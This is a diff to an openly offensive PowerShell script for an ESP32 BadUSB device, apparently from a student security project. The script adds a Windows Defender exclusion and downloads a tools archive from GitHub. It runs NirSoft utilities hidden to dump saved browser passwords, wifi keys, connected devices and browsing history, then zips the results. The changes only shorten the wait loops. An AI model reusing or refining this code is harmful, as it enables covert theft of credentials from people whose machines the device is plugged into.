@@ -21,6 +21,7 @@ Add-MpPreference -ExclusionPath $basePath -Force
 # Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
 # Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
 # Tải duy nhất 1 file
+
 $zipUrl = "https://github.com/Sunlaii/ANM-Esp32BadUSB/raw/refs/heads/MinhNhat/tools.zip"
 Invoke-WebRequest $zipUrl -OutFile "tools.zip"
 
@@ -39,9 +40,9 @@ Start-Process -FilePath ".\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFil
 Start-Process -FilePath ".\WebBrowserPassView.exe" -ArgumentList "/stext passwords.txt" -WindowStyle Hidden
 Start-Process -FilePath ".\WirelessKeyView.exe" -ArgumentList "/stext wifi.txt" -WindowStyle Hidden
 
-# Wait for the files to be fully written
+# Wait for the files to be fully written (Ép xung kiểm tra mỗi 100ms)
 while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
-    Start-Sleep -Seconds 1
+    Start-Sleep -Milliseconds 100
 }
 
 Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"
@@ -51,7 +52,7 @@ Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
 
 # Wait until the ZIP file is created
 while (!(Test-Path "$dumpFile")) {
-    Start-Sleep -Seconds 1
+    Start-Sleep -Milliseconds 100
 }
 
 
